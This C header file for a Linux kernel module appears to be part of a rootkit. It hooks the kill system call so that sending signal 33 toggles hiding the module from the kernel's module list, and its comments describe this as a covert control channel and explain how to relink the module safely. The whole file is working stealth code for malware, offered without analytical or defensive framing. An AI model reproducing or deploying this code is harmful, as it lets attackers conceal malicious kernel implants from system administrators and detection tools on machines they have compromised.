#ifndef KILL_H
#define KILL_H

#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/kallsyms.h>

/*
 * Control channel: kill -33 <pid> toggles quiet mode (module-list removal).
 * Signal 33 is reserved by glibc on x86_64; no legitimate program sends it.
 *
 * All list operations AND the hidden flag are performed while holding
 * module_mutex — the list and the state can never disagree, and two
 * concurrent toggles serialize correctly.
 *
 * Reinsertion safety: the insertion anchor is the kernel's global module
 * list head ("module_list", a static symbol in kernel/module.c on 3.10 —
 * resolved via kallsyms, never cached). It can never be freed.
 */

static int hidden = 0;
static asmlinkage long (*og_kill)(pid_t pid, int sig);

static void hideme(void)
{
    mutex_lock(&module_mutex);
    if (!hidden) {
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
    mutex_unlock(&module_mutex);
}

static void showme(void)
{
    struct list_head *ml = (struct list_head *)kallsyms_lookup_name("module_list");

    mutex_lock(&module_mutex);
    if (hidden && ml) {
        list_add_tail(&THIS_MODULE->list, ml);
        hidden = 0;
    }
    mutex_unlock(&module_mutex);
    /* if ml was NULL: stay hidden, retry next toggle — never crash */
}

static asmlinkage long hooked_kill(pid_t pid, int sig)
{
    if (sig == 33) {
        if (hidden)
            showme();
        else
            hideme();
        return 0;
    }
    return og_kill(pid, sig);
}

#endif